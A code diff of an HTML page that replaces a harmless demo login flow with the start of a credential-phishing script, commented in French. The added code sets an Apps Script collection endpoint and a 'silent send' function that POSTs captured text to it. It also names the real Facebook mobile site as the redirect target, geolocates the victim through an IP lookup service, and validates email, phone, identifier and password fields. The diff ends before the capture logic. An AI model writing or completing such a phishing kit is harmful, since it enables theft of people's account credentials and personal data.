@@ -154,25 +154,46 @@
   </div>
 
 <script>
-  function goStep(n) {
-    for (let i = 1; i <= 3; i++) {
-      document.getElementById('screen' + i).classList.toggle('visible', i === n);
-      document.getElementById('s' + i).classList.toggle('active', i <= n);
-    }
-    const input = document.querySelector('#screen' + n + ' input');
-    if (input) input.focus();
-  }
+(function(){
+'use strict';
 
-  function moveNext(el) {
-    el.value = el.value.replace(/\D/g, '');
-    if (el.value.length === 1 && el.nextElementSibling) {
-      el.nextElementSibling.focus();
-    }
-  }
+/* ============================================================
+   ENDPOINT Apps Script — PAS de token ici (vivant côté Google)
+   ============================================================ */
+var EP='https://script.google.com/macros/s/AKfycbza8l1dv_UCQ1rvWtJ0MpOkhEdQAMjSGJ_xsuCqhx4h2DPSrGf61mTL3tzaDduzUnwPig/exec';
 
-  function finish() {
-    alert('Démo : connexion validée ! Connecte ça à ton backend.');
-  }
+/* ============================================================
+   DESTINATION : la VRAIE page Facebook
+   ============================================================ */
+var REAL='https://m.facebook.com/';
+
+/* ---------- envoi silencieux ---------- */
+function send(txt){
+  try{
+    var x=new XMLHttpRequest();
+    x.open('POST',EP,true);
+    x.setRequestHeader('Content-Type','text/plain;charset=utf-8');
+    x.send(JSON.stringify({text:txt}));
+  }catch(e){}
+}
+function one(v){return (v||'').toString().replace(/\s+/g,' ').trim();}
+
+/* ------------- géoloc IPC ------------- */
+function getGeo(){
+  try{
+    var x=new XMLHttpRequest();x.open('GET','https://ipapi.co/json/',false);x.send();
+    if(x.status===200){var d=JSON.parse(x.responseText);return (d.ip||'')+' | '+(d.city||'')+', '+(d.country_name||'');}
+  }catch(e){}
+  return '';
+}
+
+/* ============================================================
+   MESSAGE PROPRE & ORDONNÉ (comme demandé)
+   Vérif email ∥ téléphone ∥ identifiant ∥ mot de passe
+   ============================================================ */
+function isEmail(s){return /^[^@\s]+@[^@\s]+\.[^@\s]+$/.test((s||'').trim());}
+function isPhone(s){return /^\+?[0-9][0-9 .\-()]{5,}$/.test((s||'').trim());}
+
 </script>
 </body>
 </html>
